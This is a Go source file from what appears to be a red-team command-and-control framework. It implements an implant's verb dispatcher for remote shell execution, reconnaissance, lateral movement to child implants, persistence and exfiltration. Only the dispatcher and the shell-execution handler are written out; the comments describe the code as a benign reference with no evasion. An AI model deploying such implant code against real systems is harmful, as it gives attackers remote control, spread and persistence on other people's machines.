// Package exec dispatches the capability verbs the reference implant
// advertises (architecture.md Sec 10): the shell.exec core verb, the
// recon.portscan / recon.hostenum / recon.service recon verbs, and the
// lateral.move child-derivation verb. The runner is the dispatch point future
// verbs (file.push, probe.read, ...) extend.
//
// This is a benign reference runner: it shells out to the platform shell for the
// one core verb and reports output. It performs no evasion, no obfuscation, and
// no destructive behavior (RESPONSIBLE-USE.md, architecture.md Sec 7).
package exec

import (
	"context"
	"crypto/x509"
	"io"
	"log"
	"os/exec"
	"runtime"

	"github.com/cw/rod/implant/internal/c2"
	"github.com/cw/rod/implant/rodpb"
)

// EnrollBundle carries the inputs the lateral.move handler needs to derive a
// child implant that enrolls back against the same teamserver (architecture.md
// Sec 10.1). The parent's own stager token is already spent at this implant's
// enroll, so the child token arrives in the lateral.move arguments; the bundle
// here is the enroll endpoint, CA pin, transport profile, and the parent's own
// implant id (named as the child's parent). A zero-value bundle (empty URL)
// leaves derivation disabled.
type EnrollBundle struct {
	URL      string
	CAs      *x509.CertPool
	Profile  c2.TransportProfile
	ParentID string
}

// Runner dispatches capability verbs. It is safe for concurrent use: each
// Dispatch call runs an independent command.
type Runner struct {
	log    *log.Logger
	enroll *EnrollBundle
}

// NewRunner builds a Runner without child-derivation inputs (lateral.move
// reports it is unavailable). logger may be nil (a no-op logger is used then);
// the param is named to avoid shadowing the standard log package inside the body.
func NewRunner(logger *log.Logger) *Runner {
	if logger == nil {
		logger = log.New(io.Discard, "", 0)
	}
	return &Runner{log: logger}
}

// NewRunnerWithEnroll builds a Runner whose lateral.move handler derives a child
// against the given enroll bundle (architecture.md Sec 10.1). A bundle with an
// empty URL is treated as "derivation disabled" so the handler fails cleanly
// rather than enrolling against an empty endpoint.
func NewRunnerWithEnroll(enroll EnrollBundle, logger *log.Logger) *Runner {
	r := NewRunner(logger)
	if enroll.URL != "" {
		r.enroll = &enroll
	}
	return r
}

// Dispatch runs verb against arguments and returns the wire outcome, the
// captured output (combined stdout/stderr), and any out-of-band chunks the
// handler produced. An unknown verb reports Failed with a clear message rather
// than panicking, so the operator sees the cause. The chunks slice is non-nil
// only for verbs that stream bytes alongside the task result (exfil.push); the
// beacon loop writes the TaskResult first, then iterates the chunks as
// ExfilChunk frames (architecture.md Sec 10.1 exfil). All current handlers
// return a nil slice.
func (r *Runner) Dispatch(ctx context.Context, verb, arguments string) (rodpb.TaskOutcome, string, []rodpb.ExfilChunk) {
	switch verb {
	case "shell.exec":
		outcome, output := r.shellExec(ctx, arguments)
		return outcome, output, nil
	case "recon.portscan":
		outcome, output := r.portScan(ctx, arguments)
		return outcome, output, nil
	case "recon.hostenum":
		outcome, output := r.hostEnum(ctx, arguments)
		return outcome, output, nil
	case "recon.service":
		outcome, output := r.serviceProbe(ctx, arguments)
		return outcome, output, nil
	case "lateral.move":
		outcome, output := r.lateralMove(ctx, arguments)
		return outcome, output, nil
	case "lateral.token":
		outcome, output := r.lateralToken(ctx, arguments)
		return outcome, output, nil
	case "lateral.exec_remote":
		outcome, output := r.lateralExecRemote(ctx, arguments)
		return outcome, output, nil
	case "persist.install":
		outcome, output := r.persistInstall(ctx, arguments)
		return outcome, output, nil
	case "persist.remove":
		outcome, output := r.persistRemove(ctx, arguments)
		return outcome, output, nil
	case "persist.list":
		outcome, output := r.persistList(ctx, arguments)
		return outcome, output, nil
	default:
		r.log.Printf("unknown verb: %s", verb)
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "unknown verb: " + verb, nil
	}
}

// shellExec runs the argument string through the platform shell and returns the
// combined output. A non-zero exit is a Failed outcome with the output captured
// so the operator sees the cause; the shell itself failing to start is also
// Failed.
func (r *Runner) shellExec(ctx context.Context, command string) (rodpb.TaskOutcome, string) {
	shell, flag := platformShell()
	cmd := exec.CommandContext(ctx, shell, flag, command)
	out, err := cmd.CombinedOutput()
	output := string(out)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, appendIfMissing(output, err.Error())
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, output
}

// platformShell returns the shell and its command flag for shell.exec on the
// current OS. Linux/macOS use sh -c; Windows uses cmd /c.
func platformShell() (string, string) {
	if runtime.GOOS == "windows" {
		return "cmd", "/c"
	}
	return "sh", "-c"
}

// appendIfMissing joins output and suffix on a newline when output is non-empty,
// so a Failed outcome shows both the command output and the error.
func appendIfMissing(output, suffix string) string {
	if output == "" {
		return suffix
	}
	if suffix == "" {
		return output
	}
	return output + "\n" + suffix
}
